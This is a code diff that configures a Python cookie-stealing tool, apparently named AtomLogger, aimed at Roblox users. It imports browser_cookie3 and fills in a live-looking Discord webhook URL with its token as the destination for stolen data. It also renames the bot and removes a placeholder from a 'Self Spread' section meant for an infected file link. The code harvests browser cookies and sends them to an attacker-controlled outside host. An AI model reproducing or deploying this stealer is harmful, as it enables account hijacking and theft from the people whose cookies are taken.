@@ -1,11 +1,10 @@
 import browser_cookie3, requests, urllib, re, os
 
 #   Settings - Webhook    #
-webhook = 'WEBHOOK URL HERE'
-avatarUrl = 'https://i1.wp.com/creativenerds.co.uk/wp-content/uploads/2010/08/cookie_39.png?resize=550%2C400'
-botName = 'AtomLogger | ROBLOX'
+webhook = 'https://discord.com/api/webhooks/1485692385928413194/d8eEJbLKw5uduwT7CX9th4fNypOG7NVZNESf_WoMXjsplrtBl5Xl9jV-eoj-5xkqkKwZ'
+avatarUrl = 'https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fimages-wixmp-ed30a86b8c4ca887773594c2.wixmp.com%2Ff%2Fe35656ff-9190-4f2d-85c0-0cd74a1c2ee8%2Fdfdzlg1-8abe77e7-3d13-49fd-b290-fe6d28212a23.png%2Fv1%2Ffill%2Fw_894%2Ch_894%2Cq_70%2Cstrp%2Fcookie_monster_creep_by_taggedzi_dfdzlg1-pre.jpg%3Ftoken%3DeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MTAyNCIsInBhdGgiOiJcL2ZcL2UzNTY1NmZmLTkxOTAtNGYyZC04NWMwLTBjZDc0YTFjMmVlOFwvZGZkemxnMS04YWJlNzdlNy0zZDEzLTQ5ZmQtYjI5MC1mZTZkMjgyMTJhMjMucG5nIiwid2lkdGgiOiI8PTEwMjQifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6aW1hZ2Uub3BlcmF0aW9ucyJdfQ.7mXOjCpjSWK4F4Cnn3JJ8LXuxpVD164v_nIEAZ4BUCs&f=1&nofb=1&ipt=4a181f86f4429c6f7a3dcc3773a874c69d9e5f566c1d18ce257b5b2c6244c9cc'
+botName = 'aiehaieeheiheeih | ROBLOX'
 #   Settings - Self Spread    #
-fileLink = 'INFECTED FILE URL HERE'
 
 #   Functions   #
 def sendWebhook(message):
